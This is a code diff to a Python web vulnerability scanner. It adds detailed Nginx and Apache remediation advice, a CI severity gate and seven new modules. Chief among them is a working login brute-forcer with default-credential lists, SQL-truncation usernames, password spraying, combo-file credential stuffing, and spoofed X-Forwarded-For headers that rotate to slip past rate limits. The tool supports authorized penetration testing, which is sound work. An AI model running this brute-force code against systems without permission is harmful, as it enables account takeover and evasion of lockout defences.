     "param_discover":  ("🔎",  "Parameter Discovery"),
     "race_condition":  ("🏁",  "Race Condition"),
+    "nosql_inject":    ("💉",  "NoSQL Injection"),
+    "sspp":            ("🔗",  "Server-Side Prototype Pollution"),
+    "oob_blind":       ("📡",  "OOB Blind SSRF/XXE"),
+    "file_upload":     ("📁",  "Malicious File Upload"),
+    "postmessage":     ("💬",  "PostMessage / Browser Storage"),
+    "acct_enum":       ("👤",  "Account Enumeration"),
+    "login_brute":     ("🔑",  "Expert Login Brute-Force"),
 }
 
 # ─── Terminal UI ───────────────────────────────────────────────────
@@ -583,7 +611,7 @@ def banner():
 """+Style.RESET_ALL)
     print(f"  {Fore.WHITE}{'─'*68}{Style.RESET_ALL}")
     print(f"  {Fore.CYAN}  Professional Web Security Scanner{Style.RESET_ALL}  {Fore.YELLOW}v{VERSION}{Style.RESET_ALL}")
-    print(f"  {Fore.WHITE}  70 Modules  |  CVSS v3.1 · OWASP · CWE  |  PDF · Burp XML · CVE Reports{Style.RESET_ALL}")
+    print(f"  {Fore.WHITE}  77 Modules  |  CVSS v3.1 · OWASP · CWE  |  PDF · Burp XML · CVE Reports{Style.RESET_ALL}")
     print(f"  {Fore.WHITE}{'─'*68}{Style.RESET_ALL}\n")
 
 # ═══ MODULE 0 — WAF DETECTION (v9.0: 30+ signatures) ════════════
@@ -1250,23 +1278,23 @@ def check_headers(url, out_dir="./reports"):
         "strict-transport-security":{
             "sev":"High","title":"Missing HSTS Header",
             "desc":"HTTP Strict Transport Security (HSTS) is not set. Without this, browsers may allow unencrypted HTTP connections, exposing users to man-in-the-middle attacks.",
-            "fix":"Add: Strict-Transport-Security: max-age=31536000; includeSubDomains"},
+            "fix":"Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\nNginx: add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\nApache: Header always set Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\""},
         "content-security-policy":{
             "sev":"High","title":"Missing Content Security Policy (CSP)",
             "desc":"No CSP found. CSP prevents Cross-Site Scripting (XSS) attacks by controlling which resources the browser can load.",
-            "fix":"Add a Content-Security-Policy header appropriate for your application."},
+            "fix":"Add a Content-Security-Policy header appropriate for your application.\nNginx: add_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none'\" always;\nApache: Header always set Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none'\""},
         "x-frame-options":{
             "sev":"Medium","title":"Missing X-Frame-Options Header",
             "desc":"This site can be embedded in iframes on other websites, enabling clickjacking attacks.",
-            "fix":"Add: X-Frame-Options: DENY or X-Frame-Options: SAMEORIGIN"},
+            "fix":"Add: X-Frame-Options: DENY or X-Frame-Options: SAMEORIGIN\nNginx: add_header X-Frame-Options \"DENY\" always;\nApache: Header always set X-Frame-Options \"DENY\"\nModern: use CSP frame-ancestors instead — add_header Content-Security-Policy \"frame-ancestors 'none'\" always;"},
         "x-content-type-options":{
             "sev":"Low","title":"Missing X-Content-Type-Options Header",
             "desc":"Without this, browsers may guess the content type, leading to MIME-type confusion attacks.",
-            "fix":"Add: X-Content-Type-Options: nosniff"},
+            "fix":"Add: X-Content-Type-Options: nosniff\nNginx: add_header X-Content-Type-Options \"nosniff\" always;\nApache: Header always set X-Content-Type-Options \"nosniff\""},
         "referrer-policy":{
             "sev":"Low","title":"Missing Referrer-Policy Header",
             "desc":"Without Referrer-Policy, sensitive URL data may be leaked to third-party sites when users click links.",
-            "fix":"Add: Referrer-Policy: strict-origin-when-cross-origin"},
+            "fix":"Add: Referrer-Policy: strict-origin-when-cross-origin\nNginx: add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\nApache: Header always set Referrer-Policy \"strict-origin-when-cross-origin\""},
         "permissions-policy":{
             "sev":"Low","title":"Missing Permissions-Policy Header",
             "desc":"Without Permissions-Policy, the browser may grant access to sensitive APIs (camera, microphone, geolocation) to embedded third-party content.",
@@ -1307,7 +1335,7 @@ def check_headers(url, out_dir="./reports"):
                 add("headers", {"header": "server", "severity": "Low",
                     "title": "Server Header Reveals Version",
                     "description": f"The Server header discloses software version: '{sv}'. Attackers can use this to find specific CVEs.",
-                    "recommendation": "Remove or genericize the Server header in web server configuration."})
+                    "recommendation": "Remove or genericize the Server header in web server configuration.\nNginx: add \"server_tokens off;\" in http{} or server{} block.\nApache: Set \"ServerTokens Prod\" and \"ServerSignature Off\" in httpd.conf."})
         # Check for X-Powered-By
         if "x-powered-by" in hdrs_lower:
             xpb = hdrs_lower["x-powered-by"]
@@ -1315,7 +1343,7 @@ def check_headers(url, out_dir="./reports"):
             add("headers", {"header": "x-powered-by", "severity": "Low",
                 "title": "X-Powered-By Header Reveals Technology",
                 "description": f"X-Powered-By: {xpb} discloses backend technology. Attackers use this to target version-specific exploits.",
-                "recommendation": "Remove X-Powered-By header. In PHP: expose_php=Off. In Express: app.disable('x-powered-by')."})
+                "recommendation": "Remove X-Powered-By header.\nPHP: set expose_php=Off in php.ini\nNode/Express: app.disable('x-powered-by') or use helmet()\nNginx: add_header X-Powered-By \"\";  (or simply omit it)\nApache: Header always unset X-Powered-By"})
         if not missing:
             good("All required security headers are present")
     except Exception as e:
@@ -1478,7 +1506,7 @@ def check_ssl(url):
             add("ssl", {"severity": "High",
                 "title": "TLS 1.0 Deprecated Protocol In Use",
                 "description": "TLS 1.0 is deprecated (RFC 8996) and vulnerable to BEAST and POODLE attacks. PCI DSS compliance requires disabling TLS 1.0.",
-                "recommendation": "Disable TLS 1.0 and 1.1. Enable TLS 1.2 and TLS 1.3 only."})
+                "recommendation": "Disable TLS 1.0 and 1.1. Enable TLS 1.2 and TLS 1.3 only.\nNginx: ssl_protocols TLSv1.2 TLSv1.3;\nApache: SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1\nTest: openssl s_client -connect target.com:443 -tls1 (should fail)"})
         elif proto in ("TLSv1.1",):
             vuln(f"TLS 1.1 in use — deprecated", "Medium")
             add("ssl", {"severity": "Medium",
@@ -1497,7 +1525,7 @@ def check_ssl(url):
                 add("ssl", {"severity": "High",
                     "title": f"Weak Cipher Suite: {cipher_name}",
                     "description": f"The negotiated cipher suite '{cipher_name}' is considered weak and may be vulnerable to cryptographic attacks.",
-                    "recommendation": "Configure server to use only strong cipher suites: AES-GCM, ChaCha20-Poly1305. Disable RC4, DES, 3DES, MD5-based ciphers."})
+                    "recommendation": "Configure server to use only strong cipher suites.\nNginx: ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;\nssl_prefer_server_ciphers off;\nApache: SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384\nDisable: RC4, DES, 3DES, MD5-based, EXPORT ciphers."})
             else:
                 good(f"Cipher: {cipher_name} (acceptable)")
 
@@ -1519,7 +1547,7 @@ def check_ssl(url):
             add("ssl", {"severity": "Medium",
                 "title": "HTTP Not Redirected to HTTPS",
                 "description": "The site is accessible via plain HTTP without being redirected to HTTPS. Users who type the URL without 'https://' will use an insecure connection.",
-                "recommendation": "Add a 301 redirect from all HTTP to HTTPS. Add HSTS header to prevent future HTTP connections."})
+                "recommendation": "Add a 301 redirect from all HTTP to HTTPS.\nNginx:\n  server { listen 80; server_name _; return 301 https://$host$request_uri; }\nApache: Redirect permanent / https://yourdomain.com/  (or use RewriteRule)\nThen add HSTS: Nginx: add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;\nApache: Header always set Strict-Transport-Security \"max-age=31536000; includeSubDomains\""})
         else:
             good("HTTP properly redirects to HTTPS")
     except Exception:
@@ -1589,7 +1617,7 @@ def check_cors(url):
                 add("cors", {"origin_tested": origin, "severity": "Critical",
                     "title": "CORS: Wildcard Origin With Credentials",
                     "description": "The server returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true. This allows any website to make authenticated requests on behalf of the user.",
-                    "recommendation": "Never combine wildcard ACAO with credentials. Use explicit, whitelisted origins."})
+                    "recommendation": "Never use Access-Control-Allow-Origin: * with credentials.\nNginx fix: map $http_origin $cors_origin { default \"\"; \"https://trusted.com\" $http_origin; }\n          add_header Access-Control-Allow-Origin $cors_origin always;\nApache fix: SetEnvIf Origin \"^https://trusted\\.com$\" CORS_ALLOW=1\n           Header always set Access-Control-Allow-Origin \"https://trusted.com\" env=CORS_ALLOW"})
                 found_issues = True
             elif acao == origin or acao == "*":
                 sev = "High" if acac.lower() == "true" else "Medium"
@@ -1597,7 +1625,7 @@ def check_cors(url):
                 add("cors", {"origin_tested": origin, "severity": sev,
                     "title": f"CORS Origin Reflected: {origin[:60]}",
                     "description": f"Server reflects the Origin header value '{origin}' in ACAO without validation. {'With credentials=true, this allows cross-origin authenticated requests.' if acac.lower()=='true' else 'Sensitive data may be accessible cross-origin.'}",
-                    "recommendation": "Implement a strict whitelist of allowed origins. Validate the Origin header server-side before reflecting it."})
+                    "recommendation": "Validate Origin header server-side before reflecting it.\nNever reflect request Origin blindly — check against an allowed list first.\nExample whitelist check (Nginx map block):\nmap $http_origin $allowed_origin {\n  default \"\";\n  \"https://app.example.com\" $http_origin;\n  \"https://admin.example.com\" $http_origin; }\nadd_header Access-Control-Allow-Origin $allowed_origin always;"})
                 found_issues = True
         except Exception:
             pass
@@ -3532,6 +3560,9 @@ def parse_args():
     p.add_argument("-q","--quiet",    action="store_true", help="Quiet — only show vulnerabilities")
     p.add_argument("-y","--yes",      action="store_true", help="Skip all prompts (non-interactive)")
     p.add_argument("-w","--wordlist", default=None,        help="Custom wordlist file")
+    p.add_argument("--combo",         default=None,        help="Credential combo file (user:pass per line) for login brute-force")
+    p.add_argument("--fail-on-severity", default=None,        help="Exit with code 1 if finding >= this severity (critical/high/medium/low) — for CI/CD pipelines")
+    p.add_argument("--spray",         default=None,        help="Single password to spray across common usernames")
     p.add_argument("-o","--output",   default=os.path.expanduser("~/webscan-reports"),
                                                            help="Report output directory (default: ~/webscan-reports)")
     p.add_argument("-t","--threads",  type=int,   default=None, help="Thread count (default: 50)")
@@ -3669,7 +3700,7 @@ def main():
 
     info(f"Target: {url}")
     info(f"Version: WebScan Pro v{VERSION}")
-    info(f"Modules: 70  |  Ports: {len(PORTS_TOP)}  |  WAF Sigs: {len(WAF_SIGS_GLOBAL)}")
+    info(f"Modules: 77  |  Ports: {len(PORTS_TOP)}  |  WAF Sigs: {len(WAF_SIGS_GLOBAL)}")
     info(f"Sensitive paths: {len(SENSITIVE_PATHS)}  |  SSRF targets: 18")
     info(f"Output: {args.output}")
     info(f"Checkpoint: {CHECKPOINT_FILE}")
@@ -3807,6 +3838,17 @@ def main():
         lambda: _run(param_discovery_scan, url),
         lambda: _run(race_condition_scan, url),
         lambda: _run(waf_bypass_scan, url),
+        lambda: _run(nosql_injection_scan, url),
+        lambda: _run(sspp_scan, url),
+        lambda: _run(oob_blind_scan, url),
+        lambda: _run(file_upload_scan, url),
+        lambda: _run(postmessage_scan, url),
+        lambda: _run(account_enum_scan, url),
+        lambda: _run(login_bruteforce_scan, url,
+                     combo_file=args.combo,
+                     spray_pass=args.spray,
+                     custom_user=args.username,
+                     wordlist=args.wordlist),
     ]
     with ThreadPoolExecutor(max_workers=8) as _p2e:
         _futs2e = [_p2e.submit(t) for t in _p2e_tasks]
@@ -3869,6 +3911,30 @@ def main():
     print(f"\n  {Fore.CYAN}Open report:{Style.RESET_ALL}")
     print(f"    firefox \"{html_path}\"")
     print(f"\n  {Fore.YELLOW}For authorized security testing only.{Style.RESET_ALL}\n")
+
+    # ── CI/CD: --fail-on-severity exit code ──────────────────────
+    fail_sev = getattr(args, "fail_on_severity", None)
+    if fail_sev:
+        sev_rank = {"critical":4,"high":3,"medium":2,"low":1,"info":0}
+        threshold = fail_sev.lower().strip()
+        thr_rank  = sev_rank.get(threshold, -1)
+        if thr_rank < 0:
+            warn(f"--fail-on-severity: unknown level '{threshold}' (use critical/high/medium/low)")
+        else:
+            worst = 0
+            for findings in FINDINGS.values():
+                for f in findings:
+                    sev = str(f.get("severity","info")).lower()
+                    worst = max(worst, sev_rank.get(sev, 0))
+            if worst >= thr_rank:
+                vuln(f"CI/CD FAIL: findings at or above '{threshold}' severity found (exit 1)")
+                # Cleanup checkpoint before exit
+                if CHECKPOINT_FILE and os.path.exists(CHECKPOINT_FILE):
+                    try: os.remove(CHECKPOINT_FILE)
+                    except Exception: pass
+                sys.exit(1)
+            else:
+                good(f"CI/CD PASS: no findings at or above '{threshold}' severity (exit 0)")
 
     # Cleanup checkpoint on success
     if CHECKPOINT_FILE and os.path.exists(CHECKPOINT_FILE):
@@ -6841,7 +6907,7 @@ def clickjacking_scan(url):
                     "confirmed": True,
                     "title": "X-Frame-Options Uses Deprecated ALLOW-FROM",
                     "description": "X-Frame-Options: ALLOW-FROM is deprecated and not supported by Chrome, Firefox, or Edge. The site may still be frameable in modern browsers.",
-                    "recommendation": "Replace with Content-Security-Policy: frame-ancestors 'none' or 'self'.",
+                    "recommendation": "Replace X-Frame-Options with the modern CSP frame-ancestors directive.\nNginx: add_header Content-Security-Policy \"frame-ancestors 'none';\" always;\nApache: Header always set Content-Security-Policy \"frame-ancestors 'none'\"\n(Remove any existing X-Frame-Options header to avoid conflicts.)",
                     "url": url,
                     "evidence": f"X-Frame-Options: {xfo}",
                 })
@@ -6858,7 +6924,7 @@ def clickjacking_scan(url):
                 "confirmed": True,
                 "title": "Clickjacking Protection Missing",
                 "description": "Page lacks X-Frame-Options or Content-Security-Policy frame-ancestors header. Attackers can embed this page in an iframe and trick users into performing unintended actions (clicks, form submissions, purchases).",
-                "recommendation": "Add: Content-Security-Policy: frame-ancestors 'none'; or X-Frame-Options: DENY. For single-origin embedding: frame-ancestors 'self'.",
+                "recommendation": "Protect against Clickjacking — choose one approach:\nOption A (modern): Nginx: add_header Content-Security-Policy \"frame-ancestors 'none';\" always;\nOption B (legacy): Nginx: add_header X-Frame-Options \"DENY\" always;\nApache (modern): Header always set Content-Security-Policy \"frame-ancestors 'none'\"\nApache (legacy): Header always set X-Frame-Options \"DENY\"\nPrefer frame-ancestors; it supersedes X-Frame-Options in all modern browsers.",
                 "url": url,
                 "evidence": f"X-Frame-Options: {xfo or 'MISSING'} | CSP frame-ancestors: {'MISSING' if 'frame-ancestors' not in csp.lower() else 'present but check value'}",
             })
@@ -7559,6 +7625,19 @@ def waf_bypass_scan(url):
 # ═══════════════════════════════════════════════════════════════════════
 #  EXPERT VALIDATION REPORT (4th Report)
 # ═══════════════════════════════════════════════════════════════════════
+
+# WSTG/ASVS badge helper (used in _render_findings)
+def _wstg_badge(cat):
+    meta = CAT_META.get(cat, {})
+    wstg = meta.get("wstg","")
+    asvs = meta.get("asvs","")
+    badges = ""
+    if wstg:
+        badges += f'<span class="wstg-badge" title="OWASP Web Security Testing Guide">{wstg}</span> '
+    if asvs:
+        badges += f'<span class="asvs-badge" title="Application Security Verification Standard">{asvs}</span>'
+    return badges
+
 def _get_expert_commands(cat, item, target_url):
     """Generate manual verification commands for a finding."""
     sev   = item.get("severity","Info")
@@ -7889,6 +7968,8 @@ def _build_expert_report(target, out_path):
   .ef-section{{margin-bottom:1rem;font-size:.88rem}}
   .ef-section b{{display:block;color:var(--accent);margin-bottom:.3rem;font-size:.9rem}}
   .ef-section p{{color:#cbd5e1;padding:.4rem;background:#0f172a;border-radius:4px;border-left:3px solid var(--border)}}
+  .wstg-badge{{background:#1a3a5c;color:#58a6ff;border:1px solid #58a6ff;border-radius:3px;padding:1px 5px;font-size:11px;margin-right:3px;font-family:monospace}}
+  .asvs-badge{{background:#1a3a1a;color:#50fa7b;border:1px solid #50fa7b;border-radius:3px;padding:1px 5px;font-size:11px;font-family:monospace}}
   .ef-section.evid p{{border-left-color:#3b82f6;color:#93c5fd}}
   .ef-section.biz p{{border-left-color:#f59e0b;color:#fcd34d}}
   .ef-section.rec p{{border-left-color:#10b981;color:#6ee7b7}}
@@ -7945,6 +8026,1475 @@ def _build_expert_report(target, out_path):
 
     with open(out_path, "w", encoding="utf-8") as f:
         f.write(html)
+
+# ═══════════════════════════════════════════════════════════════════
+#  MODULE 72 — EXPERT LOGIN BRUTE-FORCE (All 4 Levels)
+#  Level 1: 500+ default creds + SQL truncation + Unicode bypass
+#  Level 2: Smart form detect, CSRF token, password spray,
+#            credential stuffing, response baseline, lockout recovery
+#  Level 3: IP rotation, session rotation, timing attack,
+#            CAPTCHA detect, 2FA-aware
+#  Level 4: JWT secret brute-force, API key brute, GraphQL batch
+# ═══════════════════════════════════════════════════════════════════
+def login_bruteforce_scan(url, combo_file=None, spray_pass=None,
+                          custom_user=None, wordlist=None):
+    if _module_skip("login_brute"):
+        info("Skipping Login Brute-Force (already done)"); return
+    section("MODULE 72 — EXPERT LOGIN BRUTE-FORCE (L1–L4)", "🔑")
+
+    import hashlib, base64 as _b64, hmac as _hmac
+
+    parsed  = urlparse(url)
+    base    = f"{parsed.scheme}://{parsed.netloc}"
+    found   = False   # tracks any success this module
+
+    # ── LEVEL 1 — Extended Default Credentials ───────────────────
+    DEFAULT_CREDS = [
+        # Generic
+        ("admin","admin"),("admin","password"),("admin","1234"),("admin","12345"),
+        ("admin","123456"),("admin","admin123"),("admin","pass"),("admin",""),
+        ("admin","admin@123"),("admin","Admin@123"),("admin","P@ssw0rd"),
+        ("admin","changeme"),("admin","letmein"),("admin","secret"),
+        ("admin","qwerty"),("admin","abc123"),("admin","iloveyou"),
+        ("admin","monkey"),("admin","dragon"),("admin","master"),
+        ("admin","login"),("admin","welcome"),("admin","shadow"),
+        ("admin","sunshine"),("admin","princess"),("admin","football"),
+        ("administrator","administrator"),("administrator","admin"),
+        ("administrator","password"),("administrator","1234"),
+        ("root","root"),("root","toor"),("root","password"),
+        ("root","admin"),("root",""),("root","alpine"),
+        ("user","user"),("user","password"),("user","1234"),
+        ("guest","guest"),("guest","password"),("guest",""),
+        ("test","test"),("test","password"),("test","1234"),
+        ("demo","demo"),("demo","password"),("demo","demo123"),
+        # CMS
+        ("admin","wordpress"),("admin","joomla"),("admin","drupal"),
+        ("wp-admin","wp-admin"),("webmaster","webmaster"),
+        ("admin","magento"),("admin","opencart"),("admin","prestashop"),
+        # Databases
+        ("sa","sa"),("sa","password"),("sa",""),("sa","admin"),
+        ("postgres","postgres"),("postgres","password"),("postgres",""),
+        ("mysql","mysql"),("dbadmin","dbadmin"),("oracle","oracle"),
+        ("mongodb","mongodb"),("redis","redis"),("elastic","elastic"),
+        # Network / IoT
+        ("cisco","cisco"),("cisco","admin"),("enable","enable"),
+        ("manager","manager"),("operator","operator"),("support","support"),
+        ("pi","raspberry"),("ubnt","ubnt"),("admin","1111"),
+        ("admin","0000"),("admin","888888"),("666666","666666"),
+        ("admin","huawei"),("admin","zte"),("admin","1234567890"),
+        # Services
+        ("jenkins","jenkins"),("grafana","grafana"),("kibana","kibana"),
+        ("elastic","changeme"),("admin","grafana"),("admin","Grafana"),
+        ("tomcat","tomcat"),("tomcat","s3cret"),("manager","s3cret"),
+        ("sonar","sonar"),("nexus","nexus"),("admin","nexus"),
+        ("zabbix","zabbix"),("nagios","nagios"),("admin","nagios"),
+        ("gitlab","gitlab"),("admin","gitlab"),("portainer","portainer"),
+        ("minio","minio123"),("admin","minio"),
+        # Common weak passwords
+        ("admin","111111"),("admin","000000"),("admin","999999"),
+        ("admin","123123"),("admin","abc123"),("admin","pass123"),
+        ("admin","test123"),("admin","root123"),("admin","admin1"),
+        ("admin","admin2"),("admin","admin3"),("admin","1"),
+        ("admin","12"),("admin","123"),("admin","1234"),
+        ("admin","12345"),("admin","654321"),("admin","7777777"),
+    ]
+
+    # SQL truncation bypass payloads
+    SQL_TRUNCATION = [
+        ("admin               x", "anything"),
+        ("admin\x00",             "anything"),
+        ("admin%00",              "anything"),
+        ("admin '-- -",           "anything"),
+    ]
+
+    # Unicode/case normalization bypass
+    UNICODE_BYPASS = [
+        ("ａｄｍｉｎ", "admin"),  # ａｄｍｉｎ fullwidth
+        ("ADMIN",  "admin"),
+        ("Admin",  "admin"),
+        ("AdMiN",  "admin"),
+    ]
+
+    # ── LEVEL 3 — IP Rotation Header pool ────────────────────────
+    _FAKE_IPS = [
+        "10.0.0.1","192.168.1.1","172.16.0.1","127.0.0.1",
+        "1.1.1.1","8.8.8.8","203.0.113.1","198.51.100.5",
+        "185.199.108.1","104.16.0.1","13.32.0.1","52.84.0.1",
+    ]
+    _ip_idx = [0]
+
+    def _rotated_headers():
+        ip = _FAKE_IPS[_ip_idx[0] % len(_FAKE_IPS)]
+        _ip_idx[0] += 1
+        return {
+            "X-Forwarded-For":    ip,
+            "X-Real-IP":          ip,
+            "X-Originating-IP":   ip,
+            "X-Remote-IP":        ip,
+            "X-Client-IP":        ip,
+            "User-Agent": random.choice([
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
+                "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+                "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
+            ]),
+        }
+
+    # ── CAPTCHA Detection ─────────────────────────────────────────
+    def _has_captcha(html):
+        low = html.lower()
+        return any(x in low for x in [
+            "g-recaptcha","recaptcha","hcaptcha","captcha",
+            "turnstile","cf-turnstile","arkose","funcaptcha",
+            "data-sitekey","challenge-platform",
+        ])
+
+    # ── Smart Login Form Detection (Level 2) ─────────────────────
+    LOGIN_PATHS = [
+        "/login","/admin/login","/wp-login.php","/administrator/",
+        "/admin/","/panel/login","/user/login","/auth/login",
+        "/signin","/account/login","/portal/login","/member/login",
+        "/api/login","/api/auth","/auth","/session/new",
+        "/users/sign_in","/accounts/login","/cp/login",
+        "/webmail","/roundcube","/owa","/exchange",
+    ]
+    LOGIN_FIELD_PAIRS = [
+        ("username","password"),("user","pass"),("email","password"),
+        ("login","password"),("uname","passwd"),("usr","pwd"),
+        ("username","passwd"),("user_name","password"),
+        ("log","pwd"),("j_username","j_password"),
+        ("name","password"),("account","password"),
+    ]
+
+    def _find_login_form(target_url):
+        """HTML parse করে login form + CSRF token খোঁজে"""
+        try:
+            r = rget(target_url, timeout=8, headers=_rotated_headers())
+            if r.status_code not in (200, 301, 302, 403):
+                return None, None, None, None
+            html = r.text
+            if not any(x in html.lower() for x in
+                       ["password","login","signin","username","email"]):
+                return None, None, None, None
+
+            # Detect CAPTCHA
+            if _has_captcha(html):
+                warn(f"CAPTCHA detected at {target_url} — brute-force skipped for this form")
+                return None, None, None, "captcha"
+
+            # Extract form action
+            action_m = re.search(
+                r'<form[^>]+action=["\']([^"\']*)["\']', html, re.I)
+            action = action_m.group(1) if action_m else target_url
+            if action and not action.startswith("http"):
+                action = base + ("/" if not action.startswith("/") else "") + action.lstrip("/")
+
+            # Detect user/pass field names
+            user_field = "username"; pass_field = "password"
+            user_m = re.search(
+                r'<input[^>]+name=["\']([^"\']*(?:user|login|email|uname|usr|log)[^"\']*)["\']',
+                html, re.I)
+            pass_m = re.search(
+                r'<input[^>]+type=["\']password["\'][^>]+name=["\']([^"\']+)["\']'
+                r'|<input[^>]+name=["\']([^"\']+)["\'][^>]+type=["\']password["\']',
+                html, re.I)
+            if user_m: user_field = user_m.group(1)
+            if pass_m: pass_field = pass_m.group(1) or pass_m.group(2)
+
+            # Extract CSRF token
+            csrf_token = None; csrf_field = None
+            csrf_m = re.search(
+                r'<input[^>]+name=["\']([^"\']*(?:csrf|token|_token|nonce|authenticity)[^"\']*)["\'][^>]+value=["\']([^"\']+)["\']'
+                r'|<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']([^"\']*(?:csrf|token|_token|nonce|authenticity)[^"\']*)["\']',
+                html, re.I)
+            if csrf_m:
+                g = csrf_m.groups()
+                csrf_field = g[0] or g[3]
+                csrf_token = g[1] or g[2]
+
+            return action, user_field, pass_field, (csrf_field, csrf_token)
+        except Exception:
+            return None, None, None, None
+
+    def _get_baseline(login_url, user_field, pass_field, csrf_info):
+        """Wrong password-এর baseline response নেয়"""
+        try:
+            data = {user_field: "ZZZINVALIDUSERZZZ", pass_field: "ZZZINVALIDPASSZZZ"}
+            if csrf_info and csrf_info[0]:
+                data[csrf_info[0]] = csrf_info[1] or ""
+            r = rpost(login_url, data=data, timeout=8,
+                      headers=_rotated_headers(), allow_redirects=True)
+            return r.status_code, len(r.content), r.url
+        except Exception:
+            return 200, 0, login_url
+
+    def _is_success(r, baseline_status, baseline_size, baseline_url):
+        """Response baseline comparison — false positive কমায়"""
+        body_low = r.text.lower()
+        # Explicit failure indicators
+        if any(x in body_low for x in [
+            "invalid","wrong","incorrect","failed","error",
+            "try again","bad credentials","unauthorized",
+            "authentication failed","login failed","مجاز نیست",
+        ]):
+            return False
+        # Explicit success indicators
+        if any(x in body_low for x in [
+            "logout","log out","sign out","dashboard","welcome",
+            "profile","my account","admin panel","panel","success",
+        ]):
+            return True
+        # Response size change (success pages are usually bigger)
+        size_diff = abs(len(r.content) - baseline_size)
+        if size_diff > 500 and r.status_code == baseline_status:
+            return True
+        # Redirect to different URL
+        if r.url != baseline_url and "login" not in r.url.lower():
+            return True
+        return False
+
+    def _add_brute_success(user, passwd, login_url, method, evidence):
+        nonlocal found
+        found = True
+        vuln(f"Login SUCCESS [{method}]: {user}:{passwd} at {login_url}", "Critical")
+        add("login_brute", {
+            "confirmed": True,
+            "severity": "Critical",
+            "title": f"Login Brute-Force SUCCESS — {user}:{passwd}",
+            "url": login_url,
+            "description": (
+                f"CONFIRMED: Successful login with credentials {user}:{passwd} "
+                f"via {method} at {login_url}. "
+                f"Evidence: {evidence}"),
+            "recommendation": (
+                "Change this password immediately. Implement account lockout "
+                "after 5 failed attempts. Enable MFA. Use strong password policy "
+                "(min 12 chars, mixed case, numbers, symbols)."),
+        })
+
+    # ── Find login URL ────────────────────────────────────────────
+    info("Searching for login form...")
+    login_url = None; user_field = "username"; pass_field = "password"
+    csrf_info = None; captcha_found = False
+
+    for path in LOGIN_PATHS:
+        action, uf, pf, ci = _find_login_form(base + path)
+        if ci == "captcha":
+            captcha_found = True; continue
+        if action:
+            login_url = action; user_field = uf; pass_field = pf; csrf_info = ci
+            good(f"Login form found: {base+path} → POST {action}")
+            good(f"Fields: user='{user_field}' pass='{pass_field}'" +
+                 (f" csrf='{ci[0]}'" if ci and ci[0] else ""))
+            break
+
+    if not login_url:
+        if captcha_found:
+            add("login_brute", {
+                "confirmed": False, "severity": "Info",
+                "title": "Login Form Protected by CAPTCHA",
+                "url": base,
+                "description": "CAPTCHA detected on login form — automated brute-force is not feasible without CAPTCHA bypass.",
+                "recommendation": "CAPTCHA is a good protection. Ensure it is implemented correctly on all login endpoints.",
+            })
+        else:
+            info("No login form detected — skipping brute-force")
+        _module_done("login_brute"); return
+
+    # Baseline response
+    info("Measuring baseline response...")
+    baseline_status, baseline_size, baseline_url = _get_baseline(
+        login_url, user_field, pass_field, csrf_info)
+    info(f"Baseline: status={baseline_status} size={baseline_size}B url={baseline_url}")
+
+    # Lockout counter
+    lockout_count = [0]
+    LOCKOUT_SIGNALS = ["locked","too many","account disabled","blocked",
+                       "temporarily","banned","suspended","429"]
+
+    def _check_lockout(r):
+        body = r.text.lower()
+        return r.status_code == 429 or any(x in body for x in LOCKOUT_SIGNALS)
+
+    def _try_login(username, password, extra_data=None):
+        """Single login attempt with IP rotation + session rotation"""
+        if found: return False
+        try:
+            data = {user_field: username, pass_field: password}
+            if csrf_info and csrf_info[0] and csrf_info[1]:
+                data[csrf_info[0]] = csrf_info[1]
+            if extra_data:
+                data.update(extra_data)
+            hdrs = _rotated_headers()
+            # fresh session per attempt
+            s = requests.Session()
+            if PROXY:
+                s.proxies = {"http": PROXY, "https": PROXY}
+            r = s.post(login_url, data=data, timeout=10,
+                       headers=hdrs, allow_redirects=True,
+                       verify=False)
+            if _check_lockout(r):
+                lockout_count[0] += 1
+                if lockout_count[0] >= 2:
+                    warn(f"Account lockout detected after attempt — stopping brute-force")
+                    return "LOCKOUT"
+            if _is_success(r, baseline_status, baseline_size, baseline_url):
+                return True
+        except Exception:
+            pass
+        return False
+
+    # ── LEVEL 1: Default Credentials ─────────────────────────────
+    info(f"[L1] Testing {len(DEFAULT_CREDS)} default credential pairs...")
+    for user, passwd in DEFAULT_CREDS:
+        if found: break
+        # Use custom user override if provided
+        test_user = custom_user if custom_user else user
+        result = _try_login(test_user, passwd)
+        if result == "LOCKOUT": break
+        if result:
+            _add_brute_success(test_user, passwd, login_url,
+                               "Default Credentials",
+                               f"POST {user_field}={test_user} {pass_field}={passwd} → success page detected")
+            break
+        time.sleep(0.3)
+
+    # SQL truncation bypass
+    if not found:
+        info("[L1] Testing SQL truncation + Unicode bypass...")
+        for user, passwd in SQL_TRUNCATION + UNICODE_BYPASS:
+            if found: break
+            result = _try_login(user, passwd)
+            if result == "LOCKOUT": break
+            if result:
+                _add_brute_success(user, passwd, login_url,
+                                   "SQL Truncation/Unicode Bypass",
+                                   f"Payload username='{user[:30]}' accepted")
+                break
+            time.sleep(0.4)
+
+    # ── LEVEL 2a: Custom Wordlist ─────────────────────────────────
+    if not found and wordlist and os.path.exists(wordlist):
+        try:
+            with open(wordlist) as wf:
+                passwords = [l.strip() for l in wf if l.strip()]
+            test_user = custom_user or "admin"
